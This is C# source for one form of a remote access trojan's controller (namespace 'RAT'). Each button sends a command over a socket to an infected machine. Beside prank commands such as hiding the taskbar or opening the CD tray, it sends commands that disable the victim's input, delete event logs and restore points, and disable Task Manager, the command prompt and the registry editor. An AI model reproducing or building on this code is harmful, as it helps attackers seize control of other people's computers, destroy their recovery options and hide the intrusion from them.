using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;

namespace RAT
{
    public partial class FrmFun : Form
    {
        public Socket client;
        public FrmFun(Socket CurrClient)
        {
            InitializeComponent();
            client = CurrClient;
        }

        private void FrmFun_Load(object sender, EventArgs e)
        {
            this.Text = "System Management - [" + client.RemoteEndPoint.ToString() + "]";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //Show Desktop Icons
            client.Send(Encoding.ASCII.GetBytes("FunCommand|ShowDesktopIcons"));
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //Hide Desktop Icons
            client.Send(Encoding.ASCII.GetBytes("FunCommand|HideDesktopIcons"));
        }

        private void button4_Click(object sender, EventArgs e)
        {
            //Show Taskbar
            client.Send(Encoding.ASCII.GetBytes("FunCommand|ShowTaskbar"));
        }

        private void button3_Click(object sender, EventArgs e)
        {
            //Hide Taskbar
            client.Send(Encoding.ASCII.GetBytes("FunCommand|HideTaskbar"));
        }

        private void button6_Click(object sender, EventArgs e)
        {
            //Monitor On
            client.Send(Encoding.ASCII.GetBytes("FunCommand|MonitorOn"));
        }

        private void button5_Click(object sender, EventArgs e)
        {
            //Monitor Off
            client.Send(Encoding.ASCII.GetBytes("FunCommand|MonitorOff"));
        }

        private void button8_Click(object sender, EventArgs e)
        {
            //Show Clock
            client.Send(Encoding.ASCII.GetBytes("FunCommand|ShowClock"));
        }

        private void button7_Click(object sender, EventArgs e)
        {
            //Hide Clock
            client.Send(Encoding.ASCII.GetBytes("FunCommand|HideClock"));
        }

        private void button10_Click(object sender, EventArgs e)
        {
            //Enable User Input
            client.Send(Encoding.ASCII.GetBytes("FunCommand|EnableUserInput"));
        }

        private void button9_Click(object sender, EventArgs e)
        {
            //Disable User Input
            client.Send(Encoding.ASCII.GetBytes("FunCommand|DisableUserInput"));
        }

        private void button12_Click(object sender, EventArgs e)
        {
            //Show Task Icons
            client.Send(Encoding.ASCII.GetBytes("FunCommand|ShowTaskIcons"));
        }

        private void button11_Click(object sender, EventArgs e)
        {
            //Hide Task Icons
            client.Send(Encoding.ASCII.GetBytes("FunCommand|HideTaskIcons"));
        }

        private void button14_Click(object sender, EventArgs e)
        {
            //Show Cursor
            client.Send(Encoding.ASCII.GetBytes("FunCommand|ShowCursor"));
        }

        private void button13_Click(object sender, EventArgs e)
        {
            //Hide Cursor
            client.Send(Encoding.ASCII.GetBytes("FunCommand|HideCursor"));
        }

        private void button16_Click(object sender, EventArgs e)
        {
            //Show Tray Icons
            client.Send(Encoding.ASCII.GetBytes("FunCommand|ShowTrayIcons"));
        }

        private void button15_Click(object sender, EventArgs e)
        {
            //Hide Tray Icons
            client.Send(Encoding.ASCII.GetBytes("FunCommand|HideTrayIcons"));
        }

        private void button18_Click(object sender, EventArgs e)
        {
            //Open CD Tray
            client.Send(Encoding.ASCII.GetBytes("FunCommand|OpenCDTray"));
        }

        private void button17_Click(object sender, EventArgs e)
        {
            //Close CD Tray
            client.Send(Encoding.ASCII.GetBytes("FunCommand|CloseCDTray"));
        }

        private void button22_Click(object sender, EventArgs e)
        {
            //Delete Event Logs
            client.Send(Encoding.ASCII.GetBytes("FunCommand|DeleteEventLogs"));
        }

        private void button23_Click(object sender, EventArgs e)
        {
            //Delete Restore Points
            client.Send(Encoding.ASCII.GetBytes("FunCommand|DeleteRestorePoints"));
        }

        private void button20_Click(object sender, EventArgs e)
        {
            //Taskmgr
            if (radioButton1.Checked)
            {
                //Disable
                client.Send(Encoding.ASCII.GetBytes("FunCommand|Taskmgr|Disable"));
            }
            else
            {
                //Enable
                client.Send(Encoding.ASCII.GetBytes("FunCommand|Taskmgr|Enable"));
            }
        }

        private void button21_Click(object sender, EventArgs e)
        {
            //CMD
            if (radioButton1.Checked)
            {
                //Disable
                client.Send(Encoding.ASCII.GetBytes("FunCommand|CMD|Disable"));
            }
            else
            {
                //Enable
                client.Send(Encoding.ASCII.GetBytes("FunCommand|CMD|Enable"));
            }
        }

        private void button19_Click(object sender, EventArgs e)
        {
            //Regedit
            if (radioButton1.Checked)
            {
                //Disable
                client.Send(Encoding.ASCII.GetBytes("FunCommand|Regedit|Disable"));
            }
            else
            {
                //Enable
                client.Send(Encoding.ASCII.GetBytes("FunCommand|Regedit|Enable"));
            }
        }
    }
}
